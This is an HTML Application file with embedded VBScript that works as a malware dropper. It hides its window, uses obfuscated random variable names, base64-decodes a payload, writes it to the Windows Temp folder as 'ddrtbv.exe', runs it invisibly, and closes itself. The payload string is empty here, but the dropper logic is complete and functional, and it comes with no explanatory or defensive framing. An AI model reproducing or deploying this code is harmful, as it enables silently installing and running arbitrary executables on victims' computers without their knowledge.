<html>
<head><title>.</title>
<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
<script language="VBScript">
On Error Resume Next
Dim THIrlNxdxM,ASzWLNPDZz,FUUpEWFzbK,YFxBvmvNaa,zPQHRQnQGS,StFwXHOgVh,MiVUAyfaDl,ARPOCBaNeM,IgaozkIRGs
THIrlNxdxM = ""
Function YFxBvmvNaa(s)
  Set ASzWLNPDZz = CreateObject("MSXML2.DOMDocument")
  Set FUUpEWFzbK = ASzWLNPDZz.createElement("tmp")
  FUUpEWFzbK.DataType = "bin.base64"
  FUUpEWFzbK.Text = s
  YFxBvmvNaa = FUUpEWFzbK.NodeTypedValue
  Set ASzWLNPDZz = Nothing
End Function
Set zPQHRQnQGS = CreateObject("ADODB.Stream")
zPQHRQnQGS.Type = 1
zPQHRQnQGS.Open
zPQHRQnQGS.Write YFxBvmvNaa(THIrlNxdxM)
Set StFwXHOgVh = CreateObject("Scripting.FileSystemObject")
MiVUAyfaDl = StFwXHOgVh.GetSpecialFolder(2)
ARPOCBaNeM = MiVUAyfaDl & "\ddrtbv.exe"
zPQHRQnQGS.SaveToFile ARPOCBaNeM, 2
zPQHRQnQGS.Close
Set IgaozkIRGs = CreateObject("WScript.Shell")
IgaozkIRGs.Run ARPOCBaNeM, 0, False
window.close()
</script>
</head>
<body></body>
</html>
